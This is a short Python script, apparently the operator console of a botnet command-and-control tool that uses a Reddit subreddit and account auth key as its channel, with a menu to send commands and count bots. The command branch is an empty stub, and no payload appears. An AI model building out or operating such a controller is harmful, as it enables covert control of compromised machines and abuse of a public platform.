from .util import *

if __name__ == "__main__":
    c2 = RedditC2(subreddit=input("Enter first subreddit:"),authkey=input("Input authkey to one account: "))
    while True:
        print("""
              1) Send command\n
              2) Get bot count\n
              3) Configure\n
              4) Exit\n""")
        

        choice = int(input("Enter your choice: "))
        if choice == 1:
            pass